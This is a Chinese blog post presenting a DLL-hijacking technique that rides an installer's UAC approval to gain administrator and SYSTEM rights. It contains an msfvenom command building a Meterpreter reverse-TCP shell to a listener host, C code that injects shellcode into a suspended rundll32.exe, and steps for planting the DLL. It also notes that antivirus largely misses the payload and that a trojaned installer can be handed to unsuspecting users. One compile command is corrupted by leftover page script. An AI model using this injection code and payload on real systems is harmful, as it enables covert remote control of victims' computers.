# 借用UAC完成的提权思路分享

0x00 背景
=======

* * *

UAC(User Account Control，用户帐户控制)是微软为提高系统安全而在Windows Vista中引入的新技术，它要求用户在执行可能会影响计算机运行的操作或执行更改影响其他用户的设置的操作之前，提供权限或管理员‌密码。也就是说一旦用户允许启动的应用程序通过UAC验证，那么这个程序也就有了管理员权限。如果我们通过某种方式劫持了通过用户UAC验证的程序，那么相应的我们的程序也就实现了提权的过程。

0x01 提权过程概述
===========

* * *

首先我们找到目标程序，查找其动态加载的dll文件然后将其替换掉，插入我们包含shellcode的dll文件，这样用户在安装此文件的时候就会调用我们的dll文件，并执行我们的shellcode代码。同时为了防止程序崩掉导致我们的代码退出，采用注入的方式保证shellcode的稳定执行。在此过程中，如果目标程序请求UAC权限，对于用户来说这是一个正常的安装文件，一旦通过UAC验证，相应我们的shellcode也完成了提权过程。替换安装包dll文件这种行为太过于敏感，其实最后实现的方式是找到目标程序需要加载的，并且当前目录又不存在的需要联网下载的dll文件，我们只需要在该目录下放一个同名dll文件即可。

0x02 实验环境
=========

* * *

_Kali Debian7_

Kali集成Metasploit等漏洞利用工具，方便提取shellcode和反弹TCP连接。最好安装一个Mingw-w64用于编译c代码。

_windows7 x64_

主要的目标测试环境。

_Procmon.exe_

Procmon是微软出的一款强大的Windows监视工具，不但可以监视进程/线程，还可以监控到文件系统，注册表的变化等。

_install_flashplayer15x32_mssd_aaa_aih_

这里我们以flashplayer安装文件作为目标文件，版本为15x32_mssd_aaa_aih，可自行下载，或者从最后的打包附件中找到。

0x03 详细提权过程
===========

* * *

查找可劫持的dll文件
-----------

首先我们在win7系统下先打开procmon监控软件，清除一下日志信息，然后运行我们的目标文件install_flashplayer15x32_mssd_aaa_aih，运行过后会弹出UAC选项，需要用户确认授权。

![](http://drops.javaweb.org/uploads/images/98195250933deae6961c4786b46017f2961837c1.jpg)

这里我们点“是”，然后安装包开始安装并自删除，并从服务器下载所需的文件，这时候就可以关掉了，因为我们只需要看该软件包都加载了哪些dll文件。

看下Procmon.exe记录所有行为

![](http://drops.javaweb.org/uploads/images/b1e26dbdc9c05efbe99de7736e689f18bdb77d33.jpg)

信息量太大，我们需要过滤出有用的信息。

首先是只看我们目标进程的信息，添加过滤规则：

`Process Name is install_flashplayer15x32_mssd_aaa_aih`

然后是过滤掉加载系统的dll文件，只看安装包当前目录下加载的dll文件，我这里安装包存放在dllhijack文件夹下，添加过滤规则：

`Path contains dllhijack`

并且该加载dll不存在，需要联网从服务器下载，最后再添加一个过滤规则：

`Result is NAME NOT FOUND`

三个过滤规则如下所示：

![](http://drops.javaweb.org/uploads/images/0dcaafed06ff9a08758b79d05d1a22139248fafe.jpg)

经过三个规则过滤后，留下的信息就很明显了，如下图所示：

![](http://drops.javaweb.org/uploads/images/1ff14e18f661c0b7407ae8ba057eb9705cba88dc.jpg)

上边所列的dll文件都是会尝试加载，并且找不到，会联网进行下载的dll文件，因此，我们的目标就是劫持这些dll文件，也不需要替换，直接将我们的dll文件放在安装包同目录即可，这也是为什么选择这个安装程序测试的原因。如果选择其他安装包测试的，最好也是选择这种联网安装类型的，所有文件都从服务器拉取，如果安装程序没有对这些从服务器拉取的文件进行效验，就能够被劫持。

编写exploit
---------

找到劫持了dll文件后，我们进入Debian系统用msf生成shellcode，这里我们选择反弹tcp的shellcode，需要知道服务器ip地址和监听端口，这里也选择Debian系统作为服务器，ifconfig查看下ip，设置监听端口为9000，最后执行如下命令生成shellcode:

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.127.133 LPORT=9000 -f c`

![](http://drops.javaweb.org/uploads/images/79ac5ae7745e593f32bddd02ecf942016e184a1c.jpg)

为了防止程序挂掉或者退出导致shellcode也跟着退出，采用注入的方式，将shellcode注入rundll32.exe进程，然后连接远程端口。服务器监听该端口，一旦有请求就建立会话连接，注入关键代码：

```
if (CreateProcess(0, "rundll32.exe", 0, 0, 0, CREATE_SUSPENDED | IDLE_PRIORITY_CLASS, 0, 0, &si, &pi)) {
    ctx.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
    GetThreadContext(pi.hThread, &ctx);    

    ep = (LPVOID)VirtualAllocEx(pi.hProcess, NULL, SCSIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);    

    WriteProcessMemory(pi.hProcess, (PVOID)ep, &code, SCSIZE, 0);    

    #ifdef _WIN64
            ctx.Rip = (DWORD64)ep;
    #else
            ctx.Eip = (DWORD)ep;
    #endif    

    SetThreadContext(pi.hThread, &ctx);    

    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}

```

最后将程序编译，这里编译直接在Debian系统下用Mingw-w64编译，命令入下：

```
root@idhyt:[email protected]/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */shared
root@idhyt:~/maldemo# file template.dll
template.dll: PE32 executable (DLL) (console) Intel 80386, for MS Windows

```

将编译好的template.dll拷贝到win7系统中备用。

debian系统设置服务器并监听9000端口，所有命令如下：

![](http://drops.javaweb.org/uploads/images/df5a3604c622c8d202f6007a0ba2e61c2c21e137.jpg)

提权
--

将编译的template.dll文件放在install_flashplayer15x32_mssd_aaa_aih目录下，从我们监控到的可劫持dll文件中选择一个，这里我选择dhcpcsv6.dll。将我们的dll文件改名为dhcpcsvc6.dll，其他dll文件可自行尝试。之后重新运行安装包，弹出UAC选项后点“是”。

之后我们在debian系统的服务端会看到我们已经监听到了这个端口，看下会话信息：

![](http://drops.javaweb.org/uploads/images/2393dd3440421c7abbef5d0f6ee243045f47b376.jpg)

查看下当前uid，然后执行getsystem命令权限：

![](http://drops.javaweb.org/uploads/images/3be8b27924e9772ee20119e854ff6eac53b5eb9a.jpg)

可以看到已经提权成功，然后进入shell查看下文件，运行个计算器什么的

![](http://drops.javaweb.org/uploads/images/7e6edb11159ae4a760ef73fff6252384915f97a3.jpg)

0x04 总结
=======

* * *

UAC很大程度上减少PC受到恶意软件侵害的机会，但是并不表明是不可被利用的。通过这种dll劫持方式，可以将dll文件设置为隐藏，并将正常的软件(如adobe flash player)打包给用户，用户基本是察觉不到的，一旦用户正常安装，机器就会被攻击者控制。一些病毒通过劫持lpk.dll等系统dll文件造成的病毒体执行，也是利用这种思路，但是替换系统文件这种敏感操作，基本逃不过杀软的监控了。

各杀软厂商对shellcode这种检测和防御也不够严格，直接从msf中提取的shellcode，没做任何变形和过杀软处理，然后virustotal网站上扫描结果如下：

![](http://drops.javaweb.org/uploads/images/4c4874d416e1f66fcb89042f509135d2c342ac4c.jpg)

可以看出总共用了56中杀毒软件扫描，报毒的只有16个，然后看下国内的杀软：

![](http://drops.javaweb.org/uploads/images/7e5e7774b722962fdb881c9e62d00aac1c0a6461.jpg)

国内杀软全都没有报毒，所以通过dll劫持提权还是有很大的使用空间。   代码和安装包上传百度网盘：链接:[http://pan.baidu.com/s/1ntAbfQD](http://pan.baidu.com/s/1ntAbfQD)密码: rmsq 解压码：ks123456